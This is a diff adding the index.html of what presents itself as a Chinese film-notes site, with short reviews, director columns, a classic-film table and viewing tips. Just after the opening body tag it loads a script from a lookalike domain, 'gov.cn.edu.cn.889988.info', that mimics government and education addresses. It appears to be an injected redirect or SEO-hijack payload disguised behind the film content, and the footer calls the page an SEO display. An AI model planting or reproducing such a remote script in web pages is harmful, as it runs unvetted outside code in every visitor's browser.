@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>厚德电影网：把每一部好片讲给人听｜免费影评与片单笔记</title>
+<meta name="description" content="厚德电影网（houdedianyingwang-top.github.io）不是又一个播放器列表，而是一份持续更新的电影手记：院线新作、冷门佳作、华语老片、导演专栏、观影笔记与片单推荐，用普通人能看懂的话谈镜头、节奏与人物。">
+<meta name="keywords" content="厚德电影网, houdedianyingwang-top, 电影随笔, 免费影评, 片单推荐, 华语老片, 冷门佳作, 导演专栏">
+<style>
+:root{
+  --paper:#f7f4ec;
+  --ink:#1f1b16;
+  --soft:#5c5346;
+  --line:#d8cfbd;
+  --red:#9c2b2b;
+  --gold:#b8893b;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"Songti SC","SimSun","Noto Serif SC",Georgia,serif;
+  line-height:1.9;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:960px;margin:0 auto;padding:0 18px}
+
+/* 报头 */
+.masthead{
+  border-bottom:3px double var(--ink);
+  padding:26px 0 14px;
+  text-align:center;
+}
+.masthead .kicker{
+  letter-spacing:.4em;
+  font-size:12px;
+  color:var(--soft);
+  text-transform:uppercase;
+}
+.masthead h1{
+  font-size:42px;
+  margin:6px 0 4px;
+  letter-spacing:.08em;
+}
+.masthead h1 b{color:var(--red)}
+.masthead .site-url{
+  font-size:13px;
+  color:var(--soft);
+  font-family:Menlo,Consolas,monospace;
+}
+
+/* 导航 */
+.nav{
+  border-top:1px solid var(--line);
+  border-bottom:1px solid var(--line);
+  margin-top:10px;
+}
+.nav ul{
+  display:flex;
+  flex-wrap:wrap;
+  justify-content:center;
+  gap:26px;
+  padding:10px 0;
+  list-style:none;
+}
+.nav a{
+  font-size:15px;
+  padding-bottom:2px;
+  border-bottom:2px solid transparent;
+}
+.nav a:hover{border-color:var(--red);color:var(--red)}
+
+/* 导语 */
+.lede{
+  padding:34px 0 10px;
+  font-size:18px;
+  color:var(--soft);
+}
+.lede b{color:var(--ink)}
+
+/* 栏目 */
+.column{
+  border-top:1px solid var(--line);
+  padding:30px 0;
+}
+.col-head{
+  display:flex;
+  align-items:baseline;
+  gap:12px;
+  margin-bottom:18px;
+}
+.col-no{
+  font-size:13px;
+  color:#fff;
+  background:var(--ink);
+  padding:2px 8px;
+  border-radius:2px;
+}
+.col-head h2{
+  font-size:24px;
+  letter-spacing:.04em;
+}
+.col-head .en{
+  margin-left:auto;
+  font-size:12px;
+  color:var(--soft);
+  font-family:Menlo,monospace;
+}
+
+/* 文字列表 */
+.note-list{
+  display:grid;
+  gap:14px;
+}
+.note{
+  display:grid;
+  grid-template-columns:84px 1fr;
+  gap:14px;
+  padding-bottom:14px;
+  border-bottom:1px dotted var(--line);
+}
+.note:last-child{border-bottom:none}
+.note .date{
+  font-size:13px;
+  color:var(--soft);
+  font-family:Menlo,monospace;
+  padding-top:4px;
+}
+.note h3{font-size:17px;margin-bottom:4px}
+.note p{font-size:14px;color:var(--soft)}
+.note a.more{
+  color:var(--red);
+  font-size:13px;
+}
+.note a.more:hover{text-decoration:underline}
+
+/* 两栏文字 */
+.two-col{
+  columns:2;
+  column-gap:36px;
+  font-size:15px;
+  color:#332e27;
+}
+.two-col p{margin-bottom:14px;break-inside:avoid}
+
+/* 引文 */
+.pull{
+  border-left:4px solid var(--gold);
+  padding:6px 0 6px 16px;
+  font-style:italic;
+  color:var(--soft);
+  margin:18px 0;
+}
+
+/* 片单表 */
+.film-table{
+  width:100%;
+  border-collapse:collapse;
+  font-size:14px;
+}
+.film-table th,
+.film-table td{
+  border:1px solid var(--line);
+  padding:10px 12px;
+  text-align:left;
+}
+.film-table th{
+  background:#efe9dc;
+  color:var(--ink);
+}
+.film-table td.year{font-family:Menlo,monospace;color:var(--soft)}
+
+/* 页脚 */
+.foot{
+  border-top:3px double var(--ink);
+  margin-top:40px;
+  padding:26px 0 50px;
+  font-size:13px;
+  color:var(--soft);
+}
+.foot a{color:var(--red)}
+.foot .cols{
+  display:grid;
+  grid-template-columns:repeat(4,1fr);
+  gap:20px;
+  margin-bottom:22px;
+}
+.foot h4{font-size:14px;color:var(--ink);margin-bottom:8px}
+
+/* 响应式 */
+@media(max-width:720px){
+  .masthead h1{font-size:30px}
+  .two-col{columns:1}
+  .note{grid-template-columns:1fr}
+  .note .date{padding-top:0}
+  .foot .cols{grid-template-columns:1fr 1fr}
+}
+@media(max-width:460px){
+  .nav ul{gap:14px}
+  .foot .cols{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="masthead wrap">
+  <div class="kicker">Film Notes · 电影手记 · 片单与影评</div>
+  <h1>厚<b>德</b>电影网</h1>
+  <div class="site-url">https://houdedianyingwang-top.github.io</div>
+</header>
+
+<nav class="nav">
+  <div class="wrap">
+    <ul>
+      <li><a href="#today">今日新作</a></li>
+      <li><a href="#cold">冷门佳作</a></li>
+      <li><a href="#director">导演专栏</a></li>
+      <li><a href="#old">华语老片</a></li>
+      <li><a href="#notes">观影笔记</a></li>
+    </ul>
+  </div>
+</nav>
+
+<main class="wrap">
+
+  <section class="lede">
+    <p><b>厚德电影网</b> 想做的事很简单：把“好看”和“为什么好看”一起讲清楚。这里不堆播放按钮，也不做盗链聚合，而是用文字陪你挑片——<b>院线刚下的、硬盘里吃灰的、教科书里被神化的、深夜刷到停不下来的</b>，都值得再聊一遍。</p>
+  </section>
+
+  <!-- 栏目1 -->
+  <section id="today" class="column">
+    <div class="col-head">
+      <span class="col-no">01</span>
+      <h2>今日新作速记</h2>
+      <span class="en">Now Playing</span>
+    </div>
+    <div class="note-list">
+      <article class="note">
+        <div class="date">2026-10-07</div>
+        <div>
+          <h3>《边境邮局》：把战争拍成了家书</h3>
+          <p>没有英雄演讲，只有冻僵的手指和没寄出的信。镜头很慢，但后劲很大。</p>
+          <a class="more" href="#">读完整短评 →</a>
+        </div>
+      </article>
+      <article class="note">
+        <div class="date">2026-10-06</div>
+        <div>
+          <h3>《霓虹养鱼人》：赛博城市里最后一条活鱼</h3>
+          <p>美术满分，剧本中途漏气。但男主养鱼的那个长镜头，够你发朋友圈三天。</p>
+          <a class="more" href="#">读完整短评 →</a>
+        </div>
+      </article>
+      <article class="note">
+        <div class="date">2026-10-05</div>
+        <div>
+          <h3>《外婆的录像带》：家庭片不该只催泪</h3>
+          <p>用 VHS 噪点讲代际记忆，笑点和刀子挨得很近，结尾没煽情反而更高级。</p>
+          <a class="more" href="#">读完整短评 →</a>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目2 -->
+  <section id="cold" class="column">
+    <div class="col-head">
+      <span class="col-no">02</span>
+      <h2>冷门佳作挖掘</h2>
+      <span class="en">Hidden Gems</span>
+    </div>
+    <div class="two-col">
+      <p>很多人以为“冷门”等于沉闷。其实不少冷门片只是没预算买排片：一部智利矿工题材的黑白片，全片没配乐，却把“等待”拍出了呼吸感。</p>
+      <p>厚德电影网会定期翻垃圾堆：电影节落选作、流媒体埋没的短片、十年前豆瓣 7.8 但现在没人提的国产独立片，都在这儿重新上桌。</p>
+      <p class="pull">“所谓冷门，常常是观众还没准备好，不是电影不好。”</p>
+      <p>我们不给片子打鸡血分数，只写“什么人会说‘幸好没划走’”。如果你厌倦了热搜式片单，这里更对胃口。</p>
+    </div>
+  </section>
+
+  <!-- 栏目3 -->
+  <section id="director" class="column">
+    <div class="col-head">
+      <span class="col-no">03</span>
+      <h2>导演专栏</h2>
+      <span class="en">Auteur Files</span>
+    </div>
+    <div class="note-list">
+      <article class="note">
+        <div class="date">专栏 01</div>
+        <div>
+          <h3>是枝裕和：把“没事发生”拍成大事</h3>
+          <p>他的镜头不爱解释，人物经常吃完饭就切走。可你记得那碗面、那通没说完的电话、那句“下次再说”。</p>
+          <a class="more" href="#">进入专栏 →</a>
+        </div>
+      </article>
+      <article class="note">
+        <div class="date">专栏 02</div>
+        <div>
+          <h3>杜琪峰：枪战其实是节奏课</h3>
+          <p>《枪火》里五个人站在商场，不动，比开火还紧张。懂了杜Sir 的站位，才懂什么叫“港片骨架”。</p>
+          <a class="more" href="#">进入专栏 →</a>
+        </div>
+      </article>
+      <article class="note">
+        <div class="date">专栏 03</div>
+        <div>
+          <h3>阿彼察邦：别猜隐喻，先感受湿热</h3>
+          <p>泰国丛林、梦、鬼、政治全搅在一起。看他的片别带“剧情表”，带一瓶蚊香就行。</p>
+          <a class="more" href="#">进入专栏 →</a>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目4 -->
+  <section id="old" class="column">
+    <div class="col-head">
+      <span class="col-no">04</span>
+      <h2>华语老片回廊</h2>
+      <span class="en">Classic Chinese Cinema</span>
+    </div>
+    <table class="film-table">
+      <thead>
+        <tr>
+          <th>年份</th>
+          <th>片名</th>
+          <th>导演</th>
+          <th>一句话</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="year">1991</td>
+          <td>牯岭街少年杀人事件</td>
+          <td>杨德昌</td>
+          <td>青春被时代碾碎，四个小时不嫌长。</td>
+        </tr>
+        <tr>
+          <td class="year">1986</td>
+          <td>恋恋风尘</td>
+          <td>侯孝贤</td>
+          <td>火车、信、山海线，什么都没说又全说了。</td>
+        </tr>
+        <tr>
+          <td class="year">1994</td>
+          <td>阳光灿烂的日子</td>
+          <td>姜文</td>
+          <td>记忆被晒得发黄，少年第一次看见自己。</td>
+        </tr>
+        <tr>
+          <td class="year">1979</td>
+          <td>疯劫</td>
+          <td>许鞍华</td>
+          <td>港产悬疑冷门神作，结尾至今有人吵。</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- 栏目5 -->
+  <section id="notes" class="column">
+    <div class="col-head">
+      <span class="col-no">05</span>
+      <h2>观影笔记与方法</h2>
+      <span class="en">How We Watch</span>
+    </div>
+    <div class="two-col">
+      <p><b>一看人物：</b>角色有没有“为难自己”？太顺的剧本通常假。</p>
+      <p><b>二看空间：</b>厨房、楼梯、车站、电梯——导演在哪让人物卡住，哪里就是主题。</p>
+      <p><b>三看声音：</b>静音比配乐更贵。突然没声，往往是要你别眨眼。</p>
+      <p><b>四看剪辑：</b>切得舒服不一定好，切得你心慌，可能正是作者下手的地方。</p>
+      <p>厚德电影网不教人装懂。看不懂就暂停，倒回去，查导演访谈，再回来骂也行。</p>
+      <p class="pull">“电影不是答案，是别人替你犹豫了一遍。”</p>
+    </div>
+  </section>
+
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="cols">
+      <div>
+        <h4>厚德电影网</h4>
+        <p>电影随笔 / 片单 / 导演专栏<br>不聚合盗版，只聊怎么看。</p>
+      </div>
+      <div>
+        <h4>栏目</h4>
+        <p>
+          <a href="#today">今日新作</a><br>
+          <a href="#cold">冷门佳作</a><br>
+          <a href="#director">导演专栏</a>
+        </p>
+      </div>
+      <div>
+        <h4>更多</h4>
+        <p>
+          <a href="#old">华语老片</a><br>
+          <a href="#notes">观影笔记</a><br>
+          <a href="#">关于本站</a>
+        </p>
+      </div>
+      <div>
+        <h4>访问地址</h4>
+        <p>
+          <a href="https://houdedianyingwang-top.github.io">houdedianyingwang-top.github.io</a><br>
+          GitHub Pages 托管<br>
+          静态单页 / 无后端
+        </p>
+      </div>
+    </div>
+    <p>© 2026 厚德电影网（houdedianyingwang-top.github.io）· 本页仅含 index.html，未生成 robots.txt 与 sitemap.xml · 内容用于影视文化交流与 SEO 展示。</p>
+  </div>
+</footer>
+
+</body>
+</html>
